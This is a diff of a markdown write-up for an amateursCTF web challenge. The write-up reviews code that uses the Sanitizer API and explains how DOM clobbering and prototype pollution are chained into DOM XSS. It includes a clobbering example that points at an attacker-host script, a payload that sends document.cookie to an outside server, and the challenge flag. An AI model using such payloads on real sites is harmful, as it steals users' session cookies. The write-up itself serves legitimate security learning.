@@ -5,7 +5,7 @@ check out this pastebin! its a great way to store pieces of your sanity between 
 
 ---
 
-**1. Challenge overview**
+# 1. Challenge overview and code review
 
 My motivation for this challenge was to learn more about DOM XSS and bypassing sanitization methods. This was my real CTF challenge ever, and it felt kind of exciting to boot up my own Docker container for the first time ever.
 
@@ -13,20 +13,24 @@ The site itself is simple. It has Paste-bin like functionality, letting you pass
 
 There are a lot of concepts from ES10, which was released in 2019. 
 
+
+
 **The code**
 
-This is how the title element is being set:
 ```js 
-const sanitizer = new Sanitizer();      document.getElementById("title").setHTML(decodeURIComponent(`title`), { sanitizer });
+const sanitizer = new Sanitizer(); // Using the Sanitizer(); constructor
+document.getElementById("title").setHTML(decodeURIComponent(`title`), { sanitizer }); // Sanitizing user input and setting the title
 ```
-
-The [sanitizer object](https://developer.mozilla.org/en-US/docs/Web/API/Sanitizer/Sanitizer) is an object, which sanitizes the input in the .setHTML() method.
+The title element is being set with a .setHTML method, with the sanitizer constructor. What this basically does is take arbitrary user input and passes it through the sanitizer with a default configuration.
+You can read more about it here: [sanitizer object](https://developer.mozilla.org/en-US/docs/Web/API/Sanitizer/Sanitizer)
 
 ```js
 class Debug {
-	#sanitize;
-	constructor(sanitize = true) {
-			this.#sanitize = sanitize
+	#sanitize; // Private variable sanitize
+
+	// Consructor defaulting to true if no parameter are passed
+	constructor(sanitize = true) {  
+			this.#sanitize = sanitize // Setting the private variable to the parameter, which was passed
         }
                 
         get sanitize() {
@@ -39,22 +43,21 @@ The debug class is declaring a private sanitize variable and a constructor, wher
 
 ```js       
 async function loadBody() {
-    let extension = null;
+    let extension = null; // This is always null, so it's a point of interest
+
+    // Executes if window.debug exists and extension is not falsy
     if (window.debug?.extension) {
-	        let res = await fetch(window.debug?.extension.toString());
-	        extension = await res.json();
+	        let res = await fetch(window.debug?.extension.toString()); // Sets the res to the string value of the URL
+	        extension = await res.json(); // Sets the extension to be the json, which was defined in the previous response of res
         }
 ```
 
 The loadBody() function is an asynchronous function, which means it has to fulfill a promise when using the await keyword.
-
-A promise is just a constructor, which takes two functions as arguments. The functions are resolve() and reject(). Resolving means the promise is successful and rejecting means it is not successful.
-
-The ? operator in  `if (window.debug?.extension) {}`  here is checking if the class Debug exists and checking if extension true.
-
-Then it continues to use the [fetch api](https://www.javascripttutorial.net/javascript-fetch-api/) , which is a modern version of the XMLHttpRequest, which works by fulfilling a promise and after returning the response. In above code it is doing a GET request, which fetches the value of debug.extension from the window. The await keyword is there, so it can wait until the request is fully completed.
-
-Then it assigns the JSON value of the response to the variable extension. This is particularly interesting because you can actually send JSON values. More on this in the background section.
+- A promise is a constructor of it's own, which takes two functions as arguments: resolve() and reject(). Resolving means the promise is successful and rejecting means it is not successful.
+- The ? operator in  `if (window.debug?.extension) {}`  here is checking if the class Debug exists and checking if extension true.
+- Then continues to use the [fetch api](https://www.javascripttutorial.net/javascript-fetch-api/) , which is a modern version of the XMLHttpRequest, which works by fulfilling a promise.
+	- Does a GET request to the URL (fetches the value of debug.extension from the window) and waits until the request is fully completed.
+	- Then assigns the JSON value of the response to the variable extension.
 
 ```js
 const debug = Object.assign(new Debug(true), extension ?? { report: true });
@@ -77,37 +80,45 @@ let body = decodeURIComponent(`123abc`);
 	loadBody();
 ```
 
-The debug variable is being assigned a Debug object with the properties of { sanitize: true } and an extension. If the extension is null or undefined, it goes and uses the default value of { report: true }
+The debug variable is being assigned a Debug object with the properties of { sanitize: true } and an extension. 
+- The ?? operator checks if the extension is null or undefined. If undefined, sets it to { report: true }. In other cases, sets it to the extension value.
 
-It's creating a report link if debug.report is true and assigning some properties to it.
+The conditional is creating a report link if debug.report is true.
+- Might be useful if we can control the extension value or the report value.
 
-If debug.sanitize is true: it is sanitizing malicious input with [.setHTML](https://developer.mozilla.org/en-US/docs/Web/API/Element/setHTML) method. This method is experimental, and is not supported by FireFox. At this point I had to switch to Chromium.
+If debug.sanitize is true
+- Sanitizes malicious input with [.setHTML](https://developer.mozilla.org/en-US/docs/Web/API/Element/setHTML) method. *This method is experimental and not supported by FireFox.*
 
-If debug.sanitize is false, it's getting the same HTML element and setting the body of that element to the body. If we could somehow manipulate the extension and get it to set the innerHTML to the body, it would go past the sanitizer.
+If debug.sanitize is false
+- Gets the same HTML element and uses that to set the body without sanitization.
 
-**2. Challenge background**
+# 2. Challenge background
 
-First step was to understand how the code works in depth. Because there were many new concepts to me to understand, it took a little while to understand what vulnerabilities there could be.
+Because it was a simple page, it had to be vulnerable to DOM XSS in someway. I tried looking for sinks and sources but the sanitizer was in my way of glory.
 
-I'm more familiar with DOM XSS, so I tried looking ways to manipulate the code execution flow by changing either the extension variable, which removes the report link generation or attack the source, which is the sanitize boolean.
+I tried looking for multiple ways to manipulate the code execution flow by changing either the extension variable or the changing the properties of the sanitizer. 
+- To confirm that code execution flow was changes, the page had to remove the report link generation or I had to modify the sanitizing source itself.
+- This was found to be possible because of a prototype pollution vulnerability.
+- And prototype pollution was found to be possible because of a DOM Clobbering vulnerability.
 
-After looking for ways to manipulate code execution from the internet, I stumbled against prototype pollution and DOM Clobbering a little later. These were still relatively new concepts to me, so the challenge took a little while.
+These were still relatively new concepts to me, so the challenge took a little while.
 
-*What is [DOM Clobbering](https://medium.com/@shilpybanerjee/dom-clobbering-its-clobbering-time-f8dd5c8fbc4b)?*
+**What is [DOM Clobbering?](https://medium.com/@shilpybanerjee/dom-clobbering-its-clobbering-time-f8dd5c8fbc4b)**
 
-DOM Clobbering is a viable technique, when the website is reflecting user inputted HTML. If the sanitizer doesn't sanitize id and name attributes, it might be possible to control some HTML in the DOM.
+DOM Clobbering is a viable technique, when the website is reflecting user inputted HTML. If the page doesn't sanitize id and name attributes, it might be possible to control some HTML in the DOM.
+- For example, you might have an object like `someObject`.
+- Then it might call out to a variable like `variableName`.
+- If you can, make an anchor tag containing an id
+- Then create an another anchor tag with the same id, the name and a href. 
 
-For example, you might have an object like `someObject`.
-Then it might call out to a variable like `variable`.
-
-To clobber these values, you can send HTML markup with an anchor tag containing an id.
-Then you create another anchor tag with the same id, the variable name and a href. 
+Example:
 ```html
 <a id=someObject>
 <a id=someObject name=variable href="http://attacker.com/malicious.js">
 ```
 
-If these control the execution flow of JavaScript, it might be possible to end up in a completely different situation, enabling XSS or in this challenge, even Prototype Pollution.
+If the DOM changes the execution of flow in JavaScript, 
+It might be possible to end up in a completely different situation, and widening the attack surface.
 
 Based on our earlier code review, we can try to clobber the Object debug.extension with an href containing data URLs. 
 
@@ -122,7 +133,7 @@ async function loadBody() {
 ```
 
 
-*What is [prototype pollution](https://www.cobalt.io/blog/a-pentesters-guide-to-prototype-pollution-attacks)?*
+**What is [prototype pollution?](https://www.cobalt.io/blog/a-pentesters-guide-to-prototype-pollution-attacks)**
 
 "Well, firstly it needs to be understood that everything in JavaScript is an object: functions, strings, arrays etc. JavaScript inheritance is based on prototypes. Objects automatically inherit all of the properties of their assigned prototype, unless they already have their own property with the same key. 
 
@@ -187,9 +198,9 @@ Essentially I'm sending the same payload, but with a redirect to my server and s
 <img src=x onerror=document.location='http://webserver.com/?'+document.cookie;>
 ```
 
-***Flag: amateursCTF{s@nit1zer_ap1_pr3tty_go0d_but_not_p3rf3ct}***
+*Flag: amateursCTF{s@nit1zer_ap1_pr3tty_go0d_but_not_p3rf3ct}*
 
-**4. Lessons learned**
+# 4. Lessons learned 
 
 I learned two new techniques from this challenge: Prototype Pollution and DOM Clobbering. At first I just wanted to hone my skills on DOM XSS but I realized the fact that vulnerabilities are usually chained in some way.
 
